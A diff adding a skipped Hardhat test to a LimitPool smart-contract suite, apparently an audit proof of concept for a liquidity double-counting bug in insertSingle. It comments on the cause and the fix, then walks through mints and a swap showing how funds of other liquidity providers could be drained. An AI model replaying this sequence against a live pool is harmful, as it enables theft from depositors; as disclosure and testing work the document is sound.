@@ -3075,4 +3075,96 @@ describe('LimitPool Tests', function () {
             console.log('balance after token1:', (await hre.props.token1.balanceOf(hre.props.limitPool.address)).toString())
         }
     });
+
+    it.skip('insertSingle double counts liquidity', async function () {
+        const liquidityAmount = '20051041647900280328782'
+
+        // Get pool price right on an even tick
+        let pool0Tick = await getTickAtPrice(true);
+        let pool1Tick = await getTickAtPrice(false);
+
+        expect(pool0Tick).to.eq(50);
+        expect(pool1Tick).to.eq(50);
+
+        // Initial mint to get the pool.price to tick 0 with liquidity there
+        await validateMint({
+            signer: hre.props.bob,
+            recipient: hre.props.bob.address,
+            lower: '0',
+            upper: '100',
+            amount: tokenAmount,
+            zeroForOne: true,
+            balanceInDecrease: tokenAmount,
+            liquidityIncrease: liquidityAmount,
+            upperTickCleared: false,
+            lowerTickCleared: true,
+            revertMessage: '',
+        })
+
+        // Mint such that the lower is at the pool.price
+        // Notice that the validation fails, as the liquidity is double counted
+        // The pool.liquidity goes to liquidityAmount.mul(2), however the liquidityDelta for
+        // tick 0 is incremented to liquidityAmount.
+        // The validation is commented out atm to show the full effects of this bug.
+
+        // This is because the pool.liquidity is not zeroed out, meanwhile the tick.liquidityDelta is still incremented
+        // by the pool.liquidity when the following are satisfied:
+        // * params.lower == tickToSave
+        // * pool.price == roundedPrice
+        // * tickToSave.priceAt == 0
+
+        // The remediation is to ensure that whenever the liquidityDelta is updated on the tickToSave,
+        // the pool.liquidity is zeroed out, every time.
+        await validateMint({
+            signer: hre.props.alice,
+            recipient: hre.props.alice.address,
+            lower: '0',
+            upper: '100',
+            amount: tokenAmount,
+            zeroForOne: true,
+            balanceInDecrease: tokenAmount,
+            liquidityIncrease: liquidityAmount,
+            upperTickCleared: false,
+            lowerTickCleared: true,
+            revertMessage: '',
+        })
+
+        // Now this tick 0 can be crossed and it's liquidity delta can be added to the pool liquidity.
+        // This is catastrophic as now the liquidity from other positions (far from the current price)
+        // Can now be used to swap in the pool at the current price, and when these users attempt to burn
+        // They will receive an ERC20 token balance underflow and experience a significant loss.
+
+        // Mint a position to move down a tick so that the cross tick is tick 0 which has the extra liquidity
+        await validateMint({
+            signer: hre.props.alice,
+            recipient: hre.props.alice.address,
+            lower: '-10',
+            upper: '90',
+            amount: tokenAmount,
+            zeroForOne: true,
+            balanceInDecrease: tokenAmount,
+            liquidityIncrease: "20041019134030931248014",
+            upperTickCleared: false,
+            lowerTickCleared: true,
+            revertMessage: '',
+        })
+
+        // ~ liquidityAmount * 3 has actually been added, however I can swap more than the token amount
+        // that should be supported by the actual liquidity that has been added.
+        //
+        // In this scenario since there are no other positions away from the current price, this will result in
+        // and ERC20 balance underflow. In a real life scenario this would drain funds from positions away from the
+        // current price and result in significant losses for those users.
+        await validateSwap({
+            signer: hre.props.alice,
+            recipient: hre.props.alice.address,
+            zeroForOne: false,
+            amountIn: tokenAmountBn.mul(4),
+            priceLimit: maxPrice,
+            balanceInDecrease: '301403234913524799094',
+            balanceOutIncrease: '299999999999999999999',
+            revertMessage: '',
+        })
+
+    })
 })
